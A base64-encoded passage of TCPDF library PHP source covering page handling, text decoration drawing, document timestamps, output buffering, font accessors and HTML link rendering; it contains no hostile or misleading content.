VENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJG9yaWVudGF0aW9uKSkgewoJCQlpZiAoaXNzZXQoJHRoaXMtPkN1ck9yaWVudGF0aW9uKSkgewoJCQkJJG9yaWVudGF0aW9uID0gJHRoaXMtPkN1ck9yaWVudGF0aW9uOwoJCQl9IGVsc2VpZiAoJHRoaXMtPmZ3UHQgPiAkdGhpcy0+ZmhQdCkgewoJCQkJLy8gbGFuZHNjYXBlCgkJCQkkb3JpZW50YXRpb24gPSAnTCc7CgkJCX0gZWxzZSB7CgkJCQkvLyBwb3J0cmFpdAoJCQkJJG9yaWVudGF0aW9uID0gJ1AnOwoJCQl9CgkJfQoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkZm9ybWF0KSkgewoJCQkkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV0gPSAkdGhpcy0+cGFnZWRpbVsoJHRoaXMtPnBhZ2UgLSAxKV07CgkJCSR0aGlzLT5zZXRQYWdlT3JpZW50YXRpb24oJG9yaWVudGF0aW9uKTsKCQl9IGVsc2UgewoJCQkkdGhpcy0+c2V0UGFnZUZvcm1hdCgkZm9ybWF0LCAkb3JpZW50YXRpb24pOwoJCX0KCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkkdGhpcy0+eCA9ICR0aGlzLT53IC0gJHRoaXMtPnJNYXJnaW47CgkJfSBlbHNlIHsKCQkJJHRoaXMtPnggPSAkdGhpcy0+bE1hcmdpbjsKCQl9CgkJJHRoaXMtPnkgPSAkdGhpcy0+dE1hcmdpbjsKCQlpZiAoaXNzZXQoJHRoaXMtPm5ld3BhZ2Vncm91cFskdGhpcy0+cGFnZV0pKSB7CgkJCS8vIHN0YXJ0IGEgbmV3IGdyb3VwCgkJCSR0aGlzLT5jdXJycGFnZWdyb3VwID0gJHRoaXMtPm5ld3BhZ2Vncm91cFskdGhpcy0+cGFnZV07CgkJCSR0aGlzLT5wYWdlZ3JvdXBzWyR0aGlzLT5jdXJycGFnZWdyb3VwXSA9IDE7CgkJfSBlbHNlaWYgKGlzc2V0KCR0aGlzLT5jdXJycGFnZWdyb3VwKSBBTkQgKCR0aGlzLT5jdXJycGFnZWdyb3VwID4gMCkpIHsKCQkJKyskdGhpcy0+cGFnZWdyb3Vwc1skdGhpcy0+Y3VycnBhZ2Vncm91cF07CgkJfQoJfQoKCS8qKgoJICogTWFyayBlbmQgb2YgcGFnZS4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIF9lbmRwYWdlKCkgewoJCSR0aGlzLT5zZXRWaXNpYmlsaXR5KCdhbGwnKTsKCQkkdGhpcy0+c3RhdGUgPSAxOwoJfQoKCS8qKgoJICogQmVnaW4gYSBuZXcgb2JqZWN0IGFuZCByZXR1cm4gdGhlIG9iamVjdCBudW1iZXIuCgkgKiBAcmV0dXJuIGludCBvYmplY3QgbnVtYmVyCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfbmV3b2JqKCkgewoJCSR0aGlzLT5fb3V0KCR0aGlzLT5fZ2V0b2JqKCkpOwoJCXJldHVybiAkdGhpcy0+bjsKCX0KCgkvKioKCSAqIFJldHVybiB0aGUgc3RhcnRpbmcgb2JqZWN0IHN0cmluZyBmb3IgdGhlIHNlbGVjdGVkIG9iamVjdCBJRC4KCSAqIEBwYXJhbSBpbnR8bnVsbCAkb2JqaWQgT2JqZWN0IElEIChsZWF2ZSBlbXB0eSB0byBnZXQgYSBuZXcgSUQpLgoJICogQHJldHVybiBzdHJpbmcgdGhlIHN0YXJ0aW5nIG9iamVjdCBzdHJpbmcKCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjguMDA5ICgyMDEwLTA4LTIwKQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gX2dldG9iaigkb2JqaWQ9bnVsbCkgewoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkb2JqaWQpKSB7CgkJCSsrJHRoaXMtPm47CgkJCSRvYmppZCA9ICR0aGlzLT5uOwoJCX0KCQkkdGhpcy0+b2Zmc2V0c1skb2JqaWRdID0gJHRoaXMtPmJ1ZmZlcmxlbjsKCQkkdGhpcy0+cGFnZW9iamVjdHNbJHRoaXMtPnBhZ2VdW10gPSAkb2JqaWQ7CgkJcmV0dXJuICRvYmppZC4nIDAgb2JqJzsKCX0KCgkvKioKCSAqIFVuZGVybGluZSB0ZXh0LgoJICogQHBhcmFtIGludCAkeCBYIGNvb3JkaW5hdGUKCSAqIEBwYXJhbSBpbnQgJHkgWSBjb29yZGluYXRlCgkgKiBAcGFyYW0gc3RyaW5nICR0eHQgdGV4dCB0byB1bmRlcmxpbmUKCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIF9kb3VuZGVybGluZSgkeCwgJHksICR0eHQpIHsKCQkkdyA9ICR0aGlzLT5HZXRTdHJpbmdXaWR0aCgkdHh0KTsKCQlyZXR1cm4gJHRoaXMtPl9kb3VuZGVybGluZXcoJHgsICR5LCAkdyk7Cgl9CgoJLyoqCgkgKiBVbmRlcmxpbmUgZm9yIHJlY3Rhbmd1bGFyIHRleHQgYXJlYS4KCSAqIEBwYXJhbSBpbnQgJHggWCBjb29yZGluYXRlCgkgKiBAcGFyYW0gaW50ICR5IFkgY29vcmRpbmF0ZQoJICogQHBhcmFtIGludCAkdyB3aWR0aCB0byB1bmRlcmxpbmUKCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjguMDA4ICgyMDA5LTA5LTI5KQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gX2RvdW5kZXJsaW5ldygkeCwgJHksICR3KSB7CgkJJGxpbmV3ID0gLSAkdGhpcy0+Q3VycmVudEZvbnRbJ3V0J10gLyAxMDAwICogJHRoaXMtPkZvbnRTaXplUHQ7CgkJcmV0dXJuIHNwcmludGYoJyVGICVGICVGICVGIHJlIGYnLCAkeCAqICR0aGlzLT5rLCAoKCgkdGhpcy0+aCAtICR5KSAqICR0aGlzLT5rKSArICRsaW5ldyksICR3ICogJHRoaXMtPmssICRsaW5ldyk7Cgl9CgoJLyoqCgkgKiBMaW5lIHRocm91Z2ggdGV4dC4KCSAqIEBwYXJhbSBpbnQgJHggWCBjb29yZGluYXRlCgkgKiBAcGFyYW0gaW50ICR5IFkgY29vcmRpbmF0ZQoJICogQHBhcmFtIHN0cmluZyAkdHh0IHRleHQgdG8gbGluZXRocm91Z2gKCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIF9kb2xpbmV0aHJvdWdoKCR4LCAkeSwgJHR4dCkgewoJCSR3ID0gJHRoaXMtPkdldFN0cmluZ1dpZHRoKCR0eHQpOwoJCXJldHVybiAkdGhpcy0+X2RvbGluZXRocm91Z2h3KCR4LCAkeSwgJHcpOwoJfQoKCS8qKgoJICogTGluZSB0aHJvdWdoIGZvciByZWN0YW5ndWxhciB0ZXh0IGFyZWEuCgkgKiBAcGFyYW0gaW50ICR4IFggY29vcmRpbmF0ZQoJICogQHBhcmFtIGludCAkeSBZIGNvb3JkaW5hdGUKCSAqIEBwYXJhbSBpbnQgJHcgbGluZSBsZW5ndGggKHdpZHRoKQoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuOS4wMDggKDIwMDktMDktMjkpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfZG9saW5ldGhyb3VnaHcoJHgsICR5LCAkdykgewoJCSRsaW5ldyA9IC0gJHRoaXMtPkN1cnJlbnRGb250Wyd1dCddIC8gMTAwMCAqICR0aGlzLT5Gb250U2l6ZVB0OwoJCXJldHVybiBzcHJpbnRmKCclRiAlRiAlRiAlRiByZSBmJywgJHggKiAkdGhpcy0+aywgKCgoJHRoaXMtPmggLSAkeSkgKiAkdGhpcy0+aykgKyAkbGluZXcgKyAoJHRoaXMtPkZvbnRTaXplUHQgLyAzKSksICR3ICogJHRoaXMtPmssICRsaW5ldyk7Cgl9CgoJLyoqCgkgKiBPdmVybGluZSB0ZXh0LgoJICogQHBhcmFtIGludCAkeCBYIGNvb3JkaW5hdGUKCSAqIEBwYXJhbSBpbnQgJHkgWSBjb29yZGluYXRlCgkgKiBAcGFyYW0gc3RyaW5nICR0eHQgdGV4dCB0byBvdmVybGluZQoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuOS4wMTUgKDIwMTAtMDQtMTkpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfZG9vdmVybGluZSgkeCwgJHksICR0eHQpIHsKCQkkdyA9ICR0aGlzLT5HZXRTdHJpbmdXaWR0aCgkdHh0KTsKCQlyZXR1cm4gJHRoaXMtPl9kb292ZXJsaW5ldygkeCwgJHksICR3KTsKCX0KCgkvKioKCSAqIE92ZXJsaW5lIGZvciByZWN0YW5ndWxhciB0ZXh0IGFyZWEuCgkgKiBAcGFyYW0gaW50ICR4IFggY29vcmRpbmF0ZQoJICogQHBhcmFtIGludCAkeSBZIGNvb3JkaW5hdGUKCSAqIEBwYXJhbSBpbnQgJHcgd2lkdGggdG8gb3ZlcmxpbmUKCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjkuMDE1ICgyMDEwLTA0LTE5KQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gX2Rvb3ZlcmxpbmV3KCR4LCAkeSwgJHcpIHsKCQkkbGluZXcgPSAtICR0aGlzLT5DdXJyZW50Rm9udFsndXQnXSAvIDEwMDAgKiAkdGhpcy0+Rm9udFNpemVQdDsKCQlyZXR1cm4gc3ByaW50ZignJUYgJUYgJUYgJUYgcmUgZicsICR4ICogJHRoaXMtPmssICgoJHRoaXMtPmggLSAkeSArICR0aGlzLT5Gb250QXNjZW50KSAqICR0aGlzLT5rKSAtICRsaW5ldywgJHcgKiAkdGhpcy0+aywgJGxpbmV3KTsKCgl9CgoJLyoqCgkgKiBGb3JtYXQgYSBkYXRhIHN0cmluZyBmb3IgbWV0YSBpbmZvcm1hdGlvbgoJICogQHBhcmFtIHN0cmluZyAkcyBkYXRhIHN0cmluZyB0byBlc2NhcGUuCgkgKiBAcGFyYW0gaW50ICRuIG9iamVjdCBJRAoJICogQHJldHVybiBzdHJpbmcgZXNjYXBlZCBzdHJpbmcuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfZGF0YXN0cmluZygkcywgJG49MCkgewoJCWlmICgkbiA9PSAwKSB7CgkJCSRuID0gJHRoaXMtPm47CgkJfQoJCSRzID0gJHRoaXMtPl9lbmNyeXB0X2RhdGEoJG4sICRzKTsKCQlyZXR1cm4gJygnLiBUQ1BERl9TVEFUSUM6Ol9lc2NhcGUoJHMpLicpJzsKCX0KCgkvKioKCSAqIFNldCB0aGUgZG9jdW1lbnQgY3JlYXRpb24gdGltZXN0YW1wCgkgKiBAcGFyYW0gbWl4ZWQgJHRpbWUgRG9jdW1lbnQgY3JlYXRpb24gdGltZXN0YW1wIGluIHNlY29uZHMgb3IgZGF0ZS10aW1lIHN0cmluZy4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA1LjkuMTUyICgyMDEyLTAzLTIzKQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0RG9jQ3JlYXRpb25UaW1lc3RhbXAoJHRpbWUpIHsKCQlpZiAoaXNfc3RyaW5nKCR0aW1lKSkgewoJCQkkdGltZSA9IFRDUERGX1NUQVRJQzo6Z2V0VGltZXN0YW1wKCR0aW1lKTsKCQl9CgkJJHRoaXMtPmRvY19jcmVhdGlvbl90aW1lc3RhbXAgPSBpbnR2YWwoJHRpbWUpOwoJfQoKCS8qKgoJICogU2V0IHRoZSBkb2N1bWVudCBtb2RpZmljYXRpb24gdGltZXN0YW1wCgkgKiBAcGFyYW0gbWl4ZWQgJHRpbWUgRG9jdW1lbnQgbW9kaWZpY2F0aW9uIHRpbWVzdGFtcCBpbiBzZWNvbmRzIG9yIGRhdGUtdGltZSBzdHJpbmcuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNS45LjE1MiAoMjAxMi0wMy0yMykKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldERvY01vZGlmaWNhdGlvblRpbWVzdGFtcCgkdGltZSkgewoJCWlmIChpc19zdHJpbmcoJHRpbWUpKSB7CgkJCSR0aW1lID0gVENQREZfU1RBVElDOjpnZXRUaW1lc3RhbXAoJHRpbWUpOwoJCX0KCQkkdGhpcy0+ZG9jX21vZGlmaWNhdGlvbl90aW1lc3RhbXAgPSBpbnR2YWwoJHRpbWUpOwoJfQoKCS8qKgoJICogUmV0dXJucyBkb2N1bWVudCBjcmVhdGlvbiB0aW1lc3RhbXAgaW4gc2Vjb25kcy4KCSAqIEByZXR1cm4gaW50IENyZWF0aW9uIHRpbWVzdGFtcCBpbiBzZWNvbmRzLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDUuOS4xNTIgKDIwMTItMDMtMjMpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBnZXREb2NDcmVhdGlvblRpbWVzdGFtcCgpIHsKCQlyZXR1cm4gJHRoaXMtPmRvY19jcmVhdGlvbl90aW1lc3RhbXA7Cgl9CgoJLyoqCgkgKiBSZXR1cm5zIGRvY3VtZW50IG1vZGlmaWNhdGlvbiB0aW1lc3RhbXAgaW4gc2Vjb25kcy4KCSAqIEByZXR1cm4gaW50IE1vZGZpY2F0aW9uIHRpbWVzdGFtcCBpbiBzZWNvbmRzLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDUuOS4xNTIgKDIwMTItMDMtMjMpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBnZXREb2NNb2RpZmljYXRpb25UaW1lc3RhbXAoKSB7CgkJcmV0dXJuICR0aGlzLT5kb2NfbW9kaWZpY2F0aW9uX3RpbWVzdGFtcDsKCX0KCgkvKioKCSAqIFJldHVybnMgYSBmb3JtYXR0ZWQgZGF0ZSBmb3IgbWV0YSBpbmZvcm1hdGlvbgoJICogQHBhcmFtIGludCAkbiBPYmplY3QgSUQuCgkgKiBAcGFyYW0gaW50ICR0aW1lc3RhbXAgVGltZXN0YW1wIHRvIGNvbnZlcnQuCgkgKiBAcmV0dXJuIHN0cmluZyBlc2NhcGVkIGRhdGUgc3RyaW5nLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuNi4wMjggKDIwMDktMDgtMjUpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfZGF0ZXN0cmluZygkbj0wLCAkdGltZXN0YW1wPTApIHsKCQlpZiAoKGVtcHR5KCR0aW1lc3RhbXApKSBPUiAoJHRpbWVzdGFtcCA8IDApKSB7CgkJCSR0aW1lc3RhbXAgPSAkdGhpcy0+ZG9jX2NyZWF0aW9uX3RpbWVzdGFtcDsKCQl9CgkJcmV0dXJuICR0aGlzLT5fZGF0YXN0cmluZygnRDonLlRDUERGX1NUQVRJQzo6Z2V0Rm9ybWF0dGVkRGF0ZSgkdGltZXN0YW1wKSwgJG4pOwoJfQoKCS8qKgoJICogRm9ybWF0IGEgdGV4dCBzdHJpbmcgZm9yIG1ldGEgaW5mb3JtYXRpb24KCSAqIEBwYXJhbSBzdHJpbmcgJHMgc3RyaW5nIHRvIGVzY2FwZS4KCSAqIEBwYXJhbSBpbnQgJG4gb2JqZWN0IElECgkgKiBAcmV0dXJuIHN0cmluZyBlc2NhcGVkIHN0cmluZy4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIF90ZXh0c3RyaW5nKCRzLCAkbj0wKSB7CgkJaWYgKCR0aGlzLT5pc3VuaWNvZGUpIHsKCQkJLy9Db252ZXJ0IHN0cmluZyB0byBVVEYtMTZCRQoJCQkkcyA9IFRDUERGX0ZPTlRTOjpVVEY4VG9VVEYxNkJFKCRzLCB0cnVlLCAkdGhpcy0+aXN1bmljb2RlLCAkdGhpcy0+Q3VycmVudEZvbnQpOwoJCX0KCQlyZXR1cm4gJHRoaXMtPl9kYXRhc3RyaW5nKCRzLCAkbik7Cgl9CgoJLyoqCgkgKiBnZXQgcmF3IG91dHB1dCBzdHJlYW0uCgkgKiBAcGFyYW0gc3RyaW5nICRzIHN0cmluZyB0byBvdXRwdXQuCgkgKiBAcGFyYW0gaW50ICRuIG9iamVjdCByZWZlcmVuY2UgZm9yIGVuY3J5cHRpb24gbW9kZQoJICogQHByb3RlY3RlZAoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBzaW5jZSA1LjUuMDAwICgyMDEwLTA2LTIyKQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gX2dldHJhd3N0cmVhbSgkcywgJG49MCkgewoJCWlmICgkbiA8PSAwKSB7CgkJCS8vIGRlZmF1bHQgdG8gY3VycmVudCBvYmplY3QKCQkJJG4gPSAkdGhpcy0+bjsKCQl9CgkJcmV0dXJuICR0aGlzLT5fZW5jcnlwdF9kYXRhKCRuLCAkcyk7Cgl9CgoJLyoqCgkgKiBPdXRwdXQgYSBzdHJpbmcgdG8gdGhlIGRvY3VtZW50LgoJICogQHBhcmFtIHN0cmluZyAkcyBzdHJpbmcgdG8gb3V0cHV0LgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gX291dCgkcykgewoJCWlmICgkdGhpcy0+c3RhdGUgPT0gMikgewoJCQlpZiAoJHRoaXMtPmlueG9iaikgewoJCQkJLy8gd2UgYXJlIGluc2lkZSBhbiBYT2JqZWN0IHRlbXBsYXRlCgkJCQkkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ291dGRhdGEnXSAuPSAkcy4iXG4iOwoJCQl9IGVsc2VpZiAoKCEkdGhpcy0+SW5Gb290ZXIpIEFORCBpc3NldCgkdGhpcy0+Zm9vdGVybGVuWyR0aGlzLT5wYWdlXSkgQU5EICgkdGhpcy0+Zm9vdGVybGVuWyR0aGlzLT5wYWdlXSA+IDApKSB7CgkJCQkvLyBwdXRzIGRhdGEgYmVmb3JlIHBhZ2UgZm9vdGVyCgkJCQkkcGFnZWJ1ZmYgPSAkdGhpcy0+Z2V0UGFnZUJ1ZmZlcigkdGhpcy0+cGFnZSk7CgkJCQkkcGFnZSA9IHN1YnN0cigkcGFnZWJ1ZmYsIDAsIC0kdGhpcy0+Zm9vdGVybGVuWyR0aGlzLT5wYWdlXSk7CgkJCQkkZm9vdGVyID0gc3Vic3RyKCRwYWdlYnVmZiwgLSR0aGlzLT5mb290ZXJsZW5bJHRoaXMtPnBhZ2VdKTsKCQkJCSR0aGlzLT5zZXRQYWdlQnVmZmVyKCR0aGlzLT5wYWdlLCAkcGFnZS4kcy4iXG4iLiRmb290ZXIpOwoJCQkJLy8gdXBkYXRlIGZvb3RlciBwb3NpdGlvbgoJCQkJJHRoaXMtPmZvb3RlcnBvc1skdGhpcy0+cGFnZV0gKz0gc3RybGVuKCRzLiJcbiIpOwoJCQl9IGVsc2UgewoJCQkJLy8gc2V0IHBhZ2UgZGF0YQoJCQkJJHRoaXMtPnNldFBhZ2VCdWZmZXIoJHRoaXMtPnBhZ2UsICRzLiJcbiIsIHRydWUpOwoJCQl9CgkJfSBlbHNlaWYgKCR0aGlzLT5zdGF0ZSA+IDApIHsKCQkJLy8gc2V0IGdlbmVyYWwgZGF0YQoJCQkkdGhpcy0+c2V0QnVmZmVyKCRzLiJcbiIpOwoJCX0KCX0KCgkvKioKCSAqIFNldCBoZWFkZXIgZm9udC4KCSAqIEBwYXJhbSBhcnJheTxpbnQsc3RyaW5nfGZsb2F0fG51bGw+ICRmb250IEFycmF5IGRlc2NyaWJpbmcgdGhlIGJhc2ljIGZvbnQgcGFyYW1ldGVyczogKGZhbWlseSwgc3R5bGUsIHNpemUpLgoJICogQHBocHN0YW4tcGFyYW0gYXJyYXl7MDogc3RyaW5nLCAxOiBzdHJpbmcsIDI6IGZsb2F0fG51bGx9ICRmb250CgkgKiBAcHVibGljCgkgKiBAc2luY2UgMS4xCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRIZWFkZXJGb250KCRmb250KSB7CgkJJHRoaXMtPmhlYWRlcl9mb250ID0gJGZvbnQ7Cgl9CgoJLyoqCgkgKiBHZXQgaGVhZGVyIGZvbnQuCgkgKiBAcmV0dXJuIGFycmF5PGludCxzdHJpbmd8ZmxvYXR8bnVsbD4gQXJyYXkgZGVzY3JpYmluZyB0aGUgYmFzaWMgZm9udCBwYXJhbWV0ZXJzOiAoZmFtaWx5LCBzdHlsZSwgc2l6ZSkuCgkgKiBAcGhwc3Rhbi1yZXR1cm4gYXJyYXl7MDogc3RyaW5nLCAxOiBzdHJpbmcsIDI6IGZsb2F0fG51bGx9CgkgKiBAcHVibGljCgkgKiBAc2luY2UgNC4wLjAxMiAoMjAwOC0wNy0yNCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGdldEhlYWRlckZvbnQoKSB7CgkJcmV0dXJuICR0aGlzLT5oZWFkZXJfZm9udDsKCX0KCgkvKioKCSAqIFNldCBmb290ZXIgZm9udC4KCSAqIEBwYXJhbSBhcnJheTxpbnQsc3RyaW5nfGZsb2F0fG51bGw+ICRmb250IEFycmF5IGRlc2NyaWJpbmcgdGhlIGJhc2ljIGZvbnQgcGFyYW1ldGVyczogKGZhbWlseSwgc3R5bGUsIHNpemUpLgoJICogQHBocHN0YW4tcGFyYW0gYXJyYXl7MDogc3RyaW5nLCAxOiBzdHJpbmcsIDI6IGZsb2F0fG51bGx9ICRmb250CgkgKiBAcHVibGljCgkgKiBAc2luY2UgMS4xCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRGb290ZXJGb250KCRmb250KSB7CgkJJHRoaXMtPmZvb3Rlcl9mb250ID0gJGZvbnQ7Cgl9CgoJLyoqCgkgKiBHZXQgRm9vdGVyIGZvbnQuCgkgKiBAcmV0dXJuIGFycmF5PGludCxzdHJpbmd8ZmxvYXR8bnVsbD4gQXJyYXkgZGVzY3JpYmluZyB0aGUgYmFzaWMgZm9udCBwYXJhbWV0ZXJzOiAoZmFtaWx5LCBzdHlsZSwgc2l6ZSkuCgkgKiBAcGhwc3Rhbi1yZXR1cm4gYXJyYXl7MDogc3RyaW5nLCAxOiBzdHJpbmcsIDI6IGZsb2F0fG51bGx9ICRmb250CgkgKiBAcHVibGljCgkgKiBAc2luY2UgNC4wLjAxMiAoMjAwOC0wNy0yNCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGdldEZvb3RlckZvbnQoKSB7CgkJcmV0dXJuICR0aGlzLT5mb290ZXJfZm9udDsKCX0KCgkvKioKCSAqIFNldCBsYW5ndWFnZSBhcnJheS4KCSAqIEBwYXJhbSBhcnJheSAkbGFuZ3VhZ2UKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjEKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldExhbmd1YWdlQXJyYXkoJGxhbmd1YWdlKSB7CgkJJHRoaXMtPmwgPSAkbGFuZ3VhZ2U7CgkJaWYgKGlzc2V0KCR0aGlzLT5sWydhX21ldGFfZGlyJ10pKSB7CgkJCSR0aGlzLT5ydGwgPSAkdGhpcy0+bFsnYV9tZXRhX2RpciddPT0ncnRsJyA/IHRydWUgOiBmYWxzZTsKCQl9IGVsc2UgewoJCQkkdGhpcy0+cnRsID0gZmFsc2U7CgkJfQoJfQoKCS8qKgoJICogUmV0dXJucyB0aGUgUERGIGRhdGEuCgkgKiBAcHVibGljCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBnZXRQREZEYXRhKCkgewoJCWlmICgkdGhpcy0+c3RhdGUgPCAzKSB7CgkJCSR0aGlzLT5DbG9zZSgpOwoJCX0KCQlyZXR1cm4gJHRoaXMtPmJ1ZmZlcjsKCX0KCgkvKioKCSAqIE91dHB1dCBhbmNob3IgbGluay4KCSAqIEBwYXJhbSBzdHJpbmcgJHVybCBsaW5rIFVSTCBvciBpbnRlcm5hbCBsaW5rIChpLmUuOiAmbHQ7YSBocmVmPSIjMjMsNC41IiZndDtsaW5rIHRvIHBhZ2UgMjMgYXQgNC41IFkgcG9zaXRpb24mbHQ7L2EmZ3Q7KQoJICogQHBhcmFtIHN0cmluZyAkbmFtZSBsaW5rIG5hbWUKCSAqIEBwYXJhbSBib29sZWFuICRmaWxsIEluZGljYXRlcyBpZiB0aGUgY2VsbCBiYWNrZ3JvdW5kIG11c3QgYmUgcGFpbnRlZCAodHJ1ZSkgb3IgdHJhbnNwYXJlbnQgKGZhbHNlKS4KCSAqIEBwYXJhbSBib29sZWFuICRmaXJzdGxpbmUgaWYgdHJ1ZSBwcmludHMgb25seSB0aGUgZmlyc3QgbGluZSBhbmQgcmV0dXJuIHRoZSByZW1haW5pbmcgc3RyaW5nLgoJICogQHBhcmFtIGFycmF5fG51bGwgJGNvbG9yIGFycmF5IG9mIFJHQiB0ZXh0IGNvbG9yCgkgKiBAcGFyYW0gc3RyaW5nICRzdHlsZSBmb250IHN0eWxlIChVLCBELCBCLCBJKQoJICogQHBhcmFtIGJvb2xlYW4gJGZpcnN0YmxvY2sgaWYgdHJ1ZSB0aGUgc3RyaW5nIGlzIHRoZSBzdGFydGluZyBvZiBhIGxpbmUuCgkgKiBAcmV0dXJuIGludCB0aGUgbnVtYmVyIG9mIGNlbGxzIHVzZWQgb3IgdGhlIHJlbWFpbmluZyB0ZXh0IGlmICRmaXJzdGxpbmUgPSB0cnVlOwoJICogQHB1YmxpYwoJICovCglwdWJsaWMgZnVuY3Rpb24gYWRkSHRtbExpbmsoJHVybCwgJG5hbWUsICRmaWxsPWZhbHNlLCAkZmlyc3RsaW5lPWZhbHNlLCAkY29sb3I9bnVsbCwgJHN0eWxlPS0xLCAkZmlyc3RibG9jaz1mYWxzZSkgewoJCWlmIChpc3NldCgkdXJsWzFdKSBBTkQgKCR1cmxbMF0gPT0gJyMnKSBBTkQgaXNfbnVtZXJpYygkdXJsWzFdKSkgewoJCQkvLyBjb252ZXJ0IHVybCB0byBpbnRlcm5hbCBsaW5rCgkJCSRsbmtkYXRhID0gZXhwbG9kZSgnLCcsICR1cmwpOwoJCQlpZiAoaXNzZXQoJGxua2RhdGFbMF0pICkgewoJCQkJJHBhZ2UgPSBzdWJzdHIoJGxua2RhdGFbMF0sIDEpOwoJCQkJaWYgKGlzc2V0KCRsbmtkYXRhWzFdKSBBTkQgKHN0cmxlbigkbG5rZGF0YVsxXSkgPiAwKSkgewoJCQkJCSRsbmt5ID0gZmxvYXR2YWwoJGxua2RhdGFbMV0pOwoJCQkJfSBlbHNlIHsKCQkJCQkkbG5reSA9IDA7CgkJCQl9CgkJCQkkdXJsID0gJHRoaXMtPkFkZExpbmsoKTsKCQkJCSR0aGlzLT5zZXRMaW5rKCR1cmwsICRsbmt5LCAkcGFnZSk7CgkJCX0KCQl9CgkJLy8gc3RvcmUgY3VycmVudCBzZXR0aW5ncwoJCSRwcmV2Y29sb3IgPSAkdGhpcy0+Zmdjb2xvcjsKCQkkcHJldnN0eWxlID0gJHRoaXMtPkZvbnRTdHlsZTsKCQlpZiAoZW1wdHkoJGNvbG9yKSkgewoJCQkkdGhpcy0+c2V0VGV4dENvbG9yQXJyYXkoJHRoaXMtPmh0bWxMaW5rQ29sb3JBcnJheSk7CgkJfSBlbHNlIHsKCQkJJHRoaXMtPnNldFRleHRDb2xvckFycmF5KCRjb2xvcik7CgkJfQoJCWlmICgkc3R5bGUgPT0gLTEpIHsKCQkJJHRoaXMtPnNldEZvbnQoJycsICR0aGlzLT5Gb250U3R5bGUuJHRoaXMtPmh0bWxMaW5rRm9udFN0eWxlKTsKCQl9IGVsc2UgewoJCQkkdGhpcy0+c2V0Rm9udCgnJywgJHRoaXMtPkZvbnRTdHlsZS4kc3R5bGUpOwoJCX0KCQkkcmV0ID0gJHRoaXMtPldyaXRlKCR0aGlzLT5sYXN0aCwgJG5hbWUsICR1cmwsICRmaWxsLCAnJywgZmFsc2UsIDAsICRmaXJzdGxpbmUsICRmaXJzdGJsb2NrLCAwKTsKCQkvLyByZXN0b3JlIHNldHRpbmdzCgkJJHRoaXMtPnNldEZvbnQoJycsICRwcmV2c3R5bGUpOwoJCSR0aGlzLT5zZXRUZXh0Q29sb3JBcnJheSgkcHJldmNvbG9yKTsKCQlyZXR1cm4gJHJldDsKCX0KCgkvKioKCSAqIENvbnZlcnRzIHBpeGVscyB0byBVc2VyJ3MgVW5pdHMuCgkgKiBAcGFyYW0gaW50ICRweCBwaXhlbHMKCSAqIEByZXR1cm4gZmxvYXQgdmFsdWUgaW4gdXNlcidzIHVuaXQKCSAqIEBwdWJsaWMKCSAqIEBzZWUgc2V0SW1hZ2VTY2FsZSgpLCBnZXRJbWFnZVNjYWxlKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHBpeGVsc1RvVW5pdHMoJHB4KSB7CgkJcmV0dXJuICgkcHggLyAoJHRoaXMtPmltZ3NjYWxlICogJHRoaXMtPmspKTsKCX0KCgkvKioKCSAqIFJldmVyc2UgZnVuY3Rpb24gZm9yIGh0bWxlbnRpdGllcy4KCSAqIENvbnZlcnQgZW50aXRpZXMgaW4gVVRGLTguCgkgKiBAcGFyYW0gc3RyaW5nICR0ZXh0X3RvX2NvbnZlcnQgVGV4dCB0byBjb252ZXJ0LgoJICogQHJldHVybiBzdHJpbmcgY29udmVydGVkIHRleHQgc3RyaW5nCgkgKiBAcHVibGljCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiB1bmh0bWxlbnRpdGllcygkdGV4dF90b19jb252ZXJ0KSB7C